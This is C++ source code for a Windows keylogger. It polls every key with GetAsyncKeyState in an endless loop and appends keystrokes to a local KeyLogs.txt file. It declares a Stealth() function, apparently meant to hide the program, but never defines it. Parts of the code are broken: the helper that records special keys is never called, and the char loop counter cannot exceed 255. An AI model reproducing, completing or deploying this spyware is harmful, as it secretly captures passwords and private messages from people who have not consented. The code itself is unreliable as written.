#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <stdio.h>

using namespace std;

void Save(string text);
bool nonLetterButtons(int key);
void Stealth();

int main()
{
	char i;

	while (true)
	{

		for (i = 8; i <= 255; i++)
		{

			if (GetAsyncKeyState(i) == -32767) //if a Keyboard button is pressed 
			{

					ofstream logFile;
					logFile.open("KeyLogs.txt", fstream::app); //opens txt file IF buttons pressed are letters
					logFile << i;
					logFile.close();
		
			}
		}
	}
	return 0;
}

void Save(string text)
{

	ofstream logFile;
	logFile.open("KeyLogs.txt", fstream::app); //opens up txt file
	logFile << text;
	logFile.close();

}

bool nonLetterButtons(int key)
{

	switch (key)
	{

	case VK_SPACE:
		Save(" ");
		break;
	case VK_RETURN:
		Save("\n");
		break;
	case VK_SHIFT:
		Save(" (shift) ");
		break;
	case VK_OEM_PERIOD:
		Save(".");
		break;
	case VK_BACK:
		Save("\b");
		break;
	default:
		return false; //if button is not any of these options(letters), return false

	}
}